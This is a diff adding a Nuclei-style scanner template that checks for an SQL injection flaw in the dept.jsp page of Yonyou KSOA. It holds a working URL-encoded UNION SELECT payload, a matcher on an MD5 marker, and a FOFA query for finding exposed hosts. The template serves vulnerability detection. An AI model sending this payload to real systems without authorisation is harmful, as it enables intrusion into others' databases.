@@ -1,0 +1,29 @@
+id: KOSA_dept_sqli
+info:
+  name: 用友时空KSOA dept.jsp SQL注入漏洞
+  author: mike
+  severity: info
+  description: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="用友-U8-Cloud"
+requests:
+  - raw:
+      - |
+        GET /common/dept.jsp?deptid=1%27%20UNION%20ALL%20SELECT%2060%2Csys.fn_sqlvarbasetostr(HASHBYTES(%27MD5%27%2C%2712345%27))-- HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '827ccb0eea8a706c4c34a16891f84e7'
+      - type: word
+        part: header
+        words:
+          - '200'
